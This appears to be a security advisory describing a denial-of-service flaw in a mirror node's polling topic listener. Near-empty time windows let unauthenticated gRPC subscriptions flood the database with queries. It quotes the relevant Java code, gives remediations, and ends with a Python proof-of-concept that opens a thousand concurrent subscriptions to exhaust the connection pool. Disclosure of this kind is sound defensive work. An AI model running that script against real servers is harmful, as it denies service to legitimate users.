### Title
Unbounded Subscription DoS via Empty-Window Polling in PollingTopicListener

### Summary
When the `POLL` listener type is active, an unprivileged attacker can open arbitrarily many gRPC subscriptions with a `consensusEndTime` set just barely after `consensusStartTime`. Each subscription causes `PollingTopicListener.poll()` to fire a real DB query every 500 ms for up to ~30 seconds before the subscription self-terminates. Because there is no global subscription cap, thousands of concurrent subscriptions generate a sustained flood of empty DB queries that exhausts the R2DBC connection pool and denies service to legitimate subscribers.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` (lines 34–49) creates a repeating `Flux` that calls `poll()` every `interval` (default 500 ms, minimum 50 ms):

```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)
                .withFixedDelay(interval)
                .withScheduler(scheduler))
``` [1](#0-0) 

`poll()` (lines 51–62) unconditionally issues a DB query on every invocation:

```java
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
``` [2](#0-1) 

There is no guard inside `poll()` that skips the query when the filter's time window is already exhausted or empty.

**Subscription lifetime with a narrow endTime window:**

`TopicContext.isComplete()` (lines 203–215) is the only mechanism that terminates a subscription:

```java
boolean isComplete() {
    if (filter.getEndTime() == null) return false;
    if (filter.getEndTime() < startTime) return true;          // startTime = DomainUtils.now() at subscribe time
    return Instant.ofEpochSecond(0, filter.getEndTime())
            .plus(grpcProperties.getEndTimeInterval())          // default 30 s
            .isBefore(Instant.now());
}
``` [3](#0-2) 

If the attacker sets `startTime = now` and `endTime = now + 1 ns` (both pass `isValidEndTime()` because `endTime > startTime`): [4](#0-3) 

- `filter.getEndTime() < startTime` → false (endTime is 1 ns in the future)
- `endTime + 30 s` is still in the future → `isComplete()` returns false for ~30 seconds

`pastEndTime()` only signals termination once `isComplete()` flips to true: [5](#0-4) 

So each such subscription lives for ~30 seconds and fires ~60 DB queries (at 500 ms interval), all returning zero rows.

**Why existing checks are insufficient:**

- `maxConcurrentCallsPerConnection = 5` limits calls per TCP connection, but an attacker opens many connections — no global subscription cap exists. `subscriberCount` is a metrics gauge only, not enforced. [6](#0-5) 

- `isValidEndTime()` only requires `endTime > startTime` by 1 nanosecond — trivially satisfiable. [4](#0-3) 

- `isValidStartTime()` requires `startTime <= now`, so the attacker simply uses the current timestamp. [7](#0-6) 

- The `POLL` listener type is non-default (default is `REDIS`), but it is a supported, documented configuration option. [8](#0-7) 

### Impact Explanation

With 1 000 concurrent attacker subscriptions each firing one DB query per 500 ms: **2 000 DB queries/second** sustained for as long as the attacker keeps reconnecting. A typical R2DBC pool (tens of connections) is saturated, causing legitimate `subscribeTopic` calls and historical retrieval queries to queue and time out. The `db.statementTimeout` (default 10 000 ms) provides no relief because each individual query completes quickly (empty result); the pool exhaustion is from concurrency, not query duration. This maps directly to the stated severity: network-wide inability to confirm new transactions via the mirror node gRPC API. [9](#0-8) 

### Likelihood Explanation

- **No authentication required** — the gRPC `subscribeTopic` endpoint is unauthenticated.
- **Trivial to script** — a single gRPC client library call with crafted timestamps suffices.
- **Repeatable** — the attacker simply reconnects every ~30 seconds to maintain the flood.
- **Condition:** server must be configured with `listener.type = POLL`. This is a documented, operator-selectable mode, so it is a realistic deployment scenario. [10](#0-9) 

### Recommendation

1. **Add a global concurrent-subscription limit** enforced in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable threshold.
2. **Short-circuit `poll()` when the window is already closed**: before issuing the DB query, check `filter.getEndTime() != null && filter.getEndTime() <= System.nanoTime()` and return `Flux.empty()` immediately.
3. **Enforce a minimum endTime window**: reject subscriptions where `endTime - startTime` is below a meaningful threshold (e.g., 1 second) to prevent trivially empty windows.
4. **Per-IP or per-connection subscription rate limiting** at the gRPC interceptor layer.

### Proof of Concept

```python
import grpc
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp
import time, threading

MIRROR_GRPC = "mirror-node-host:5600"
TOPIC_ID = ...  # any valid topic shard/realm/num

def open_subscription():
    channel = grpc.insecure_channel(MIRROR_GRPC)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    now_ns = time.time_ns()
    start = Timestamp(seconds=now_ns // 10**9, nanos=now_ns % 10**9)
    end   = Timestamp(seconds=now_ns // 10**9, nanos=(now_ns % 10**9) + 1)  # +1 ns
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        consensusStartTime=start,
        consensusEndTime=end,
    )
    try:
        for _ in stub.subscribeTopic(req):
            pass
    except Exception:
        pass

# Open 1000 concurrent subscriptions
threads = [threading.Thread(target=open_subscription) for _ in range(1000)]
for t in threads: t.start()
# Re-open every 25 s to maintain pressure before auto-termination at ~30 s
```

Each thread holds a subscription that fires a DB query every 500 ms for ~30 seconds. With 1 000 threads, the DB connection pool is saturated within seconds, blocking all legitimate gRPC traffic.

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
